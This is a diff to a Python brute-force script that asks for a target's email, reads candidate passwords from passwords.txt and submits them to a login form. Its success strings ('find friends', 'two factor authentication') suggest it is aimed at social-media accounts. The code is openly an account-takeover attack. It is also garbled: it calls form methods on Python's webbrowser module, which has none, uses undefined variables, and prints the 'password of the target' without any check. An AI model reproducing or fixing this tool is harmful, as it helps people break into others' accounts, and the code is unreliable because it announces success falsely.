@@ -1,4 +1,5 @@
 import sys
+import requests
 from ast import Break, Try
 import webbrowser
 import time
@@ -22,23 +23,23 @@ file=open('passwords.txt','r')
 
 email = input("input Email of target:")
 print ("\nTarget Email ID : ",email+"")
-print ("\nTrying Passwords from list ")
+print ("\nTrying Passwords from list")
 i=0
 while file:
 	password=file.readline().strip()
 	i+=1
-	if len(password) < 6:
+	if len(password) < 11:
 		continue
-	print=str(i) +" : ",password
+	print("Trying"+password)
 	response = webbrowser.open(post_url)
     
-	if response: code = 200
+	if responses: code = 200
 	webbrowser.select_form(nr=0)()
 	webbrowser.select['email']=email
 	webbrowser.select['password']=password
-	request=webbrowser.submit()
-	response_data=response.read()
-	'find friends' in response_data or 'two factor authentication' in response_data or 'security code' in  response_data;
+	requests=webbrowser.submit()
+	responses_data=response.read()
+	'find friends' in responses_data or 'two factor authentication' in responses_data or 'security code' in  responses_data;
 	print("password of the target is: ",password)
 
-	sys.exit
+	break
